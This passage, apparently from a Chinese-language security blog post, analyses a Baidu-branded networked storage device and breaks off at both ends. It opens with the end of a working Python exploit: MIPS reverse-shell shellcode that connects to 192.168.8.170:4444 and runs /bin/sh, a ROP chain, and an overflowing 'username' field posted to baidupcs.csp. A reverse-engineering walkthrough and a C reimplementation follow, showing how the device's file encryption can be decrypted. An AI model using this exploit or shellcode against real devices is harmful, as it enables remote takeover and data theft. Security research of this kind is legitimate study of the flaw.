class="string">"\xff\xff\x06\x28"</span>   <span class="comment"># slti a2,zero,-1</span></span><br><span class="line">    mipselshell+=<span class="string">"\x57\x10\x02\x24"</span>   <span class="comment"># li v0,4183 # sys_socket</span></span><br><span class="line">    mipselshell+=<span class="string">"\x0c\x01\x01\x01"</span>   <span class="comment"># syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># sys_connect</span></span><br><span class="line">    <span class="comment"># a0: sockfd (stored on the stack)</span></span><br><span class="line">    <span class="comment"># a1: addr (data stored on the stack)</span></span><br><span class="line">    <span class="comment"># a2: addrlen</span></span><br><span class="line">    mipselshell+=<span class="string">"\xff\xff\xa2\xaf"</span>   <span class="comment"># sw v0,-1(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xff\xff\xa4\x8f"</span>   <span class="comment"># lw a0,-1(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xfd\xff\x0f\x34"</span>   <span class="comment"># li t7,0xfffd</span></span><br><span class="line">    mipselshell+=<span class="string">"\x27\x78\xe0\x01"</span>   <span class="comment"># nor t7,t7,zero</span></span><br><span class="line">    mipselshell+=<span class="string">"\xe2\xff\xaf\xaf"</span>   <span class="comment"># sw t7,-30(sp)</span></span><br><span class="line">    mipselshell+=struct.pack(<span class="string">'&lt;2c'</span>,ports[<span class="number">1</span>],ports[<span class="number">0</span>]) + <span class="string">"\x0e\x3c"</span>   <span class="comment"># lui t6,0x1f90</span></span><br><span class="line">    mipselshell+=struct.pack(<span class="string">'&lt;2c'</span>,ports[<span class="number">1</span>],ports[<span class="number">0</span>]) + <span class="string">"\xce\x35"</span>   <span class="comment"># ori t6,t6,0x1f90</span></span><br><span class="line">    mipselshell+=<span class="string">"\xe4\xff\xae\xaf"</span>   <span class="comment"># sw t6,-28(sp)</span></span><br><span class="line">    mipselshell+=struct.pack(<span class="string">'&lt;2c'</span>,hosts[<span class="number">1</span>],hosts[<span class="number">0</span>]) + <span class="string">"\x0e\x3c"</span>   <span class="comment"># lui t6,0x7f01</span></span><br><span class="line">    mipselshell+=struct.pack(<span class="string">'&lt;2c'</span>,hosts[<span class="number">3</span>],hosts[<span class="number">2</span>]) + <span class="string">"\xce\x35"</span>   <span class="comment"># ori t6,t6,0x101</span></span><br><span class="line">    mipselshell+=<span class="string">"\xe6\xff\xae\xaf"</span>   <span class="comment"># sw t6,-26(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xe2\xff\xa5\x27"</span>   <span class="comment"># addiu a1,sp,-30</span></span><br><span class="line">    mipselshell+=<span class="string">"\xef\xff\x0c\x24"</span>   <span class="comment"># li t4,-17</span></span><br><span class="line">    mipselshell+=<span class="string">"\x27\x30\x80\x01"</span>   <span class="comment"># nor a2,t4,zero</span></span><br><span class="line">    mipselshell+=<span class="string">"\x4a\x10\x02\x24"</span>   <span class="comment"># li v0,4170  # sys_connect</span></span><br><span class="line">    mipselshell+=<span class="string">"\x0c\x01\x01\x01"</span>   <span class="comment"># syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># sys_dup2</span></span><br><span class="line">    <span class="comment"># a0: oldfd (socket)</span></span><br><span class="line">    <span class="comment"># a1: newfd (0, 1, 2)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xfd\xff\x11\x24"</span>   <span class="comment"># li s1,-3</span></span><br><span class="line">    mipselshell+=<span class="string">"\x27\x88\x20\x02"</span>   <span class="comment"># nor s1,s1,zero</span></span><br><span class="line">    mipselshell+=<span class="string">"\xff\xff\xa4\x8f"</span>   <span class="comment"># lw a0,-1(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\x21\x28\x20\x02"</span>   <span class="comment"># move a1,s1 # dup2_loop</span></span><br><span class="line">    mipselshell+=<span class="string">"\xdf\x0f\x02\x24"</span>   <span class="comment"># li v0,4063 # sys_dup2</span></span><br><span class="line">    mipselshell+=<span class="string">"\x0c\x01\x01\x01"</span>   <span class="comment"># syscall 0x40404</span></span><br><span class="line">    mipselshell+=<span class="string">"\xff\xff\x10\x24"</span>   <span class="comment"># li s0,-1</span></span><br><span class="line">    mipselshell+=<span class="string">"\xff\xff\x31\x22"</span>   <span class="comment"># addi s1,s1,-1</span></span><br><span class="line">    mipselshell+=<span class="string">"\xfa\xff\x30\x16"</span>   <span class="comment"># bne s1,s0,68 &lt;dup2_loop&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># sys_execve</span></span><br><span class="line">    <span class="comment"># a0: filename (stored on the stack) "//bin/sh"</span></span><br><span class="line">    <span class="comment"># a1: argv "//bin/sh"</span></span><br><span class="line">    <span class="comment"># a2: envp (null)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xff\xff\x06\x28"</span>   <span class="comment"># slti a2,zero,-1</span></span><br><span class="line">    mipselshell+=<span class="string">"\x62\x69\x0f\x3c"</span>   <span class="comment"># lui t7,0x2f2f "bi"</span></span><br><span class="line">    mipselshell+=<span class="string">"\x2f\x2f\xef\x35"</span>   <span class="comment"># ori t7,t7,0x6269 "//"</span></span><br><span class="line">    mipselshell+=<span class="string">"\xec\xff\xaf\xaf"</span>   <span class="comment"># sw t7,-20(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\x73\x68\x0e\x3c"</span>   <span class="comment"># lui t6,0x6e2f "sh"</span></span><br><span class="line">    mipselshell+=<span class="string">"\x6e\x2f\xce\x35"</span>   <span class="comment"># ori t6,t6,0x7368 "n/"</span></span><br><span class="line">    mipselshell+=<span class="string">"\xf0\xff\xae\xaf"</span>   <span class="comment"># sw t6,-16(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xf4\xff\xa0\xaf"</span>   <span class="comment"># sw zero,-12(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xec\xff\xa4\x27"</span>   <span class="comment"># addiu a0,sp,-20</span></span><br><span class="line">    mipselshell+=<span class="string">"\xf8\xff\xa4\xaf"</span>   <span class="comment"># sw a0,-8(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xfc\xff\xa0\xaf"</span>   <span class="comment"># sw zero,-4(sp)</span></span><br><span class="line">    mipselshell+=<span class="string">"\xf8\xff\xa5\x27"</span>   <span class="comment"># addiu a1,sp,-8</span></span><br><span class="line">    mipselshell+=<span class="string">"\xab\x0f\x02\x24"</span>   <span class="comment"># li v0,4011 # sys_execve</span></span><br><span class="line">    mipselshell+=<span class="string">"\x0c\x01\x01\x01"</span>  <span class="comment"># syscall 0x40404</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'ending ...'</span></span><br><span class="line">    <span class="keyword">return</span> mipselshell</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"> </span><br><span class="line">    libc_base = <span class="number">0x77c1f000</span></span><br><span class="line">    sip=<span class="string">'192.168.8.170'</span>     <span class="comment">#reverse_tcp local_ip</span></span><br><span class="line">    sport = <span class="number">4444</span>            <span class="comment">#reverse_tcp local_port</span></span><br><span class="line"> </span><br><span class="line">    host = socket.ntohl(struct.unpack(<span class="string">'&lt;I'</span>,socket.inet_aton(sip))[<span class="number">0</span>])</span><br><span class="line">    shellcode = makepayload(host,sport)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s &lt;target ip&gt;"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">    payload = MIPSPayload(endianess=<span class="string">"little"</span>, badbytes=[])</span><br><span class="line">    payload.AddBuffer(<span class="number">1036</span>)                            <span class="comment"># fill offset = 1036</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x49818</span>, base=libc_base)    <span class="comment"># gadget 1: mipsrop.find("lw $ra, ") Modify register</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x0047E758</span>)            <span class="comment"># arg1</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x0047F758</span>)            <span class="comment"># arg2</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x00480758</span>)            <span class="comment"># arg3</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0xC</span>)                                <span class="comment"># fill</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s0</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x4E320</span>, base=libc_base)            <span class="comment"># s1 sleep addr 0x4E320               </span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s2</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s3</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x1E8AC</span>, base=libc_base)            <span class="comment"># s4 gadget 3: mipsrop.tail()            </span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s5</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s6</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s7</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># fp</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x4F970</span>, base=libc_base)            <span class="comment"># gadget 2: mipsrop.find("li $a0,1")                </span></span><br><span class="line">    <span class="comment"># payload.AddBuffer(0x40)                                # addiu $sp, 0x40</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x1C</span>)                                <span class="comment"># 0x28 - 0xc = 0x1c   </span></span><br><span class="line">    payload.AddAddress(<span class="number">0x4AC20</span>, base=libc_base)            <span class="comment"># s1 gadget 5: mipsrop.find("move $t9,$s0") </span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s2</span></span><br><span class="line">    payload.AddAddress(<span class="number">0x16BC8</span>, base=libc_base)            <span class="comment"># ra gadget 4: mipsrop.stackfinder()         </span></span><br><span class="line">    payload.AddBuffer(<span class="number">0x4</span>)                                <span class="comment"># s0</span></span><br><span class="line">    <span class="comment"># payload.AddBuffer(0x28)</span></span><br><span class="line">    payload.AddBuffer(<span class="number">0xC</span>)                                <span class="comment"># 0xD8 - 0xC8 =&gt; 0x10 - 0x4 = 0xC</span></span><br><span class="line">    payload.Add(shellcode)</span><br><span class="line"> </span><br><span class="line">    pdata = &#123;</span><br><span class="line">        <span class="string">'opt'</span>    : <span class="string">'Login'</span>,</span><br><span class="line">        <span class="string">'state'</span>                : <span class="string">'login'</span>,</span><br><span class="line">        <span class="string">'username'</span>            :  payload.Build()</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        HTTP(ip).Send(<span class="string">'baidupcs.csp'</span>, data=pdata)</span><br><span class="line">    <span class="keyword">except</span> httplib.BadStatusLine:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Payload delivered."</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Payload delivery failed: %s"</span> % str(e)</span><br></pre></td></tr></table></figure>
<p>​    </p>
<p>漏洞存在的原因在于，调用 getvaluefrom_url 函数时，缺少对 username 等值进行长度检查校验，而直接写入缓冲区中，导致了栈溢出。通过漏洞攻击者可直接获取到远程管理的密码，进行登入操作。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134427372.png" alt="image-20201113134427372"></p>
<h3 id="第四步：文件加密分析"><a href="#第四步：文件加密分析" class="headerlink" title="第四步：文件加密分析"></a>第四步：文件加密分析</h3><p>使用手机 app 进行文件加解密，然后通过路由器抓取数据包，其加解密 url path为 protocol.csp，根据前面整理的表格，其使用的端口是 81 端口。接下来分析此时监听 81 端口的所属进程 ioos。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134543095.png" alt="image-20201113134543095"></p>
<p>文件加密和解密数据包使用 wireshark 分析，再通过数据包的关键信息定位到加解密位置。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134616128.png" alt="image-20201113134616128"></p>
<p>开始调试前，我们先查看一下加密前后的文件</p>
<p>创建一个 test.txt 文件，并写入内容： abc</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134652524.png" alt="image-20201113134652524"></p>
<p>通过硬盘 app 进行加密，key 为 <strong>123</strong>，加密后文件加上了 <code>.enc</code> 后缀，查看 /tmp/ioos.log 日志信息</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134703946.png" alt="image-20201113134703946"></p>
<p>查看 test.txt.enc 文件，其中尾部 <code>202cb962ac59075b964b07152d234b70</code> 是 test.txt 加密key 123 的 md5 值（0x20字节），而前面“fe2889d36e2045f4a3d362445aaaf72e”（0x20字节）接下代码中会遇到。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134714930.png" alt="image-20201113134714930"></p>
<h4 id="gdb-ida-动态调试"><a href="#gdb-ida-动态调试" class="headerlink" title="gdb + ida 动态调试"></a>gdb + ida 动态调试</h4><p>将编译 mipsel 架构 gdb 后生成的 gdbserver 拷贝到硬盘 /tmp 目录。</p>
<p>远程附加调试</p>
<p>在关键函数 sub_414260 处下断点，此函数参数一为解密文件路径，为解密key的md5值</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134742657.png" alt="image-20201113134742657"></p>
<p>比较成功后，调用 stat64 返回文件信息</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134750810.png" alt="image-20201113134750810"></p>
<p>判断文件字节数是否大于 2k (0x2000字节)，若小于0x2000字节，则拷贝 md5 值的前 16 位</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134800177.png" alt="image-20201113134800177"></p>
<p>打开文件，判断文件大小是否小于 0x41，然后移动文件指针至 0x3 字节处，也就是密文（0x3字节）后面的内容处</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134812177.png" alt="image-20201113134812177"></p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134815545.png" alt="image-20201113134815545"></p>
<p>strncmp 比较密文尾部前0x20字节是否为 “fe2889d36e2045f4a3d362445aaaf72e”，查看前面的<code>.enc</code> 文件可知，这正是 md5 值前面的 0x20 字节。紧接着比较 md5 值。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134825466.png" alt="image-20201113134825466"></p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134828931.png" alt="image-20201113134828931"></p>
<p>调用 ftruncate64 打开的解密文件截断到指定的长度(0x3)。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134839941.png" alt="image-20201113134839941"></p>
<p>读取密文，然后调用解密函数 sub_404E28。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134848303.png" alt="image-20201113134848303"></p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134851298.png" alt="image-20201113134851298"></p>
<p>加解密函数 sub_404E28，首先建立 0x0 – 0xff 的数组，利用 md5 值前 16 位生成 0x100 位字节数组。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134859971.png" alt="image-20201113134859971"></p>
<p>然后通过生成的字节数组对文件内容进行加密或解密。</p>
<p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201113134907567.png" alt="image-20201113134907567"></p>
<h3 id="解密成功"><a href="#解密成功" class="headerlink" title="解密成功"></a>解密成功</h3><p>将上面的加解密函数其转换为 c 语言代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;direct.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG <span class="meta-string">"fe2889d36e2045f4a3d362445aaaf72e"</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 若文件内容小于 0x2000 字节则每个字节进行加密，且 key 为 md5(key, 32) 的前 0x10 位</span></span><br><span class="line"><span class="comment">// 若文件内容大于 0x2000 字节则只对文件的前后各 0x1000 字节进行加密，且 key 为 md5(key, 32) 的全部 0x20 位</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">enc_fun</span><span class="params">(<span class="keyword">char</span>* pContent, <span class="keyword">char</span>* pKey, <span class="keyword">uint32_t</span> uFileLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 生成 0 - 0x100 数组</span></span><br><span class="line">    <span class="keyword">uint8_t</span> arr[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; ++i)</span><br><span class="line">        arr[i] = i;</span><br><span class="line">    <span class="comment">// 利用 md5值 前 16 位生成 hash 表</span></span><br><span class="line">    <span class="keyword">uint32_t</span> a0 = <span class="number">0</span>, t0 = <span class="number">0</span>, t2 = <span class="number">0</span>, len = <span class="number">0</span>, a1 = <span class="number">0</span>, a2 = <span class="number">0</span>, LO = <span class="number">0</span>, HI = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> v1 = (<span class="keyword">uint32_t</span>)arr, a3 = (<span class="keyword">uint32_t</span>)arr;</span><br><span class="line">    <span class="keyword">uint32_t</span> t1 = (<span class="keyword">uint32_t</span>)arr + <span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">while</span> (a3 != t1) &#123;</span><br><span class="line">        a1 = pKey[a0];</span><br><span class="line">        a0++;</span><br><span class="line">        len = <span class="built_in">strlen</span>(pKey);</span><br><span class="line">        LO = a0 / len;</span><br><span class="line">        HI = a0 % len;</span><br><span class="line">        a2 = *((<span class="keyword">uint8_t</span>*)a3);    <span class="comment">// a3 为 arr 的首地址</span></span><br><span class="line">        a3++;</span><br><span class="line">        a1 += a2;</span><br><span class="line">        a1 += t0;</span><br><span class="line">        a1 &amp;= <span class="number">0xff</span>;</span><br><span class="line">        t0 = a1 &amp; <span class="number">0xff</span>;</span><br><span class="line">        a1 = v1 + a1;</span><br><span class="line">        t2 = *((<span class="keyword">uint8_t</span>*)a1);</span><br><span class="line">        *((<span class="keyword">uint8_t</span>*)a3 - <span class="number">1</span>) = t2;</span><br><span class="line">        *((<span class="keyword">uint8_t</span>*)a1) = a2;</span><br><span class="line">        a1 = HI;</span><br><span class="line">        a0 = a1 &amp; <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 对内容进行加密或解密</span></span><br><span class="line">    <span class="keyword">bool</span> isSuccessful = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> v0 = <span class="number">0</span>, s1 = uFileLen;</span><br><span class="line">    <span class="keyword">uint32_t</span> s2 = (<span class="keyword">uint32_t</span>)pContent;</span><br><span class="line">    a2 = <span class="number">0</span>, a1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// s1 = strlen(content);</span></span><br><span class="line">        <span class="keyword">if</span> (v0 &lt; s1)</span><br><span class="line">            a0 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            a0 = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (a0) &#123;</span><br><span class="line">            a0 = a1 + <span class="number">1</span>;</span><br><span class="line">            a0 &amp;= <span class="number">0xff</span>;</span><br><span class="line">            a1 = a0 &amp; <span class="number">0xff</span>;</span><br><span class="line">            a0 = v1 + a0;</span><br><span class="line">            a3 = *((<span class="keyword">uint8_t</span>*)a0);        <span class="comment">// *((uint8_t*)a0)</span></span><br><span class="line">            a2 += a3;</span><br><span class="line">            a2 &amp;= <span class="number">0xff</span>;</span><br><span class="line">            t0 = v1 + a2;</span><br><span class="line">            t1 = *((<span class="keyword">uint8_t</span>*)t0);</span><br><span class="line">            *((<span class="keyword">uint8_t</span>*)a0) = t1;</span><br><span class="line">            *((<span class="keyword">uint8_t</span>*)t0) = a3;</span><br><span class="line">            a0 = *((<span class="keyword">uint8_t</span>*)a0);</span><br><span class="line">            t0 = s2 + v0;    <span class="comment">// s2 为 content 的首地址，以 v0 迭代</span></span><br><span class="line">            a3 += a0;</span><br><span class="line">            a3 &amp;= <span class="number">0xff</span>;</span><br><span class="line">            a0 = *((<span class="keyword">uint8_t</span>*)t0);</span><br><span class="line">            a3 = *((<span class="keyword">uint8_t</span>*)v1 + a3);    <span class="comment">// *((uint8_t*)v1 + a3)</span></span><br><span class="line">            v0++;</span><br><span class="line">            a3 = a0 ^ a3;</span><br><span class="line">            <span class="comment">// seh     $v0              # 符号扩展半字</span></span><br><span class="line">            *((<span class="keyword">uint8_t</span>*)t0) = a3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">enc_file</span><span class="params">(<span class="keyword">char</span>* pfilename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 打开文件</span></span><br><span class="line">    FILE* pFile = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//     char filename[260];</span></span><br><span class="line"><span class="comment">//     printf("filepath:");</span></span><br><span class="line"><span class="comment">//     scanf_s("%s", filename, 260);</span></span><br><span class="line">    <span class="keyword">if</span> (fopen_s(&amp;pFile, pfilename, <span class="string">"rb"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"打开文件失败\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    fseek(pFile, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="keyword">uint64_t</span> Length = ftell(pFile);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取文件字节数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">stat64</span> <span class="title">info</span>;</span></span><br><span class="line">    _stat64(pfilename, &amp;info);</span><br><span class="line">    <span class="keyword">uint64_t</span> fileSize = info.st_size;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"该文件一共 %lld 字节\n"</span>, fileSize);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 求出原文件字节数</span></span><br><span class="line">    <span class="keyword">uint64_t</span> fileLen = fileSize - <span class="number">0x40</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 读取 FLAG</span></span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">0x21</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    fseek(pFile, fileLen, SEEK_SET);</span><br><span class="line">    fread_s(flag, <span class="number">0x21</span>, <span class="number">0x20</span>, <span class="number">1</span>, pFile);</span><br><span class="line">    <span class="keyword">if</span> (strncpy_s(flag, FLAG, <span class="number">0x20</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"格式错误\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// printf("flag: %s\n", flag);</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取 key</span></span><br><span class="line">    <span class="keyword">char</span> md5[<span class="number">0x21</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> encSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> enctail = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (fileLen &gt; <span class="number">0x2000</span>) &#123;</span><br><span class="line">        <span class="comment">// 文件内容大于 0x2000 字节 读取 0x20 位key, 解密前 0x1000 字节</span></span><br><span class="line">        fread_s(md5, <span class="number">0x21</span>, <span class="number">0x20</span>, <span class="number">1</span>, pFile);</span><br><span class="line">        encSize = <span class="number">0x1000</span>;</span><br><span class="line">        enctail = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 文件内容小于 0x2000 字节 读取 0x10 位key, 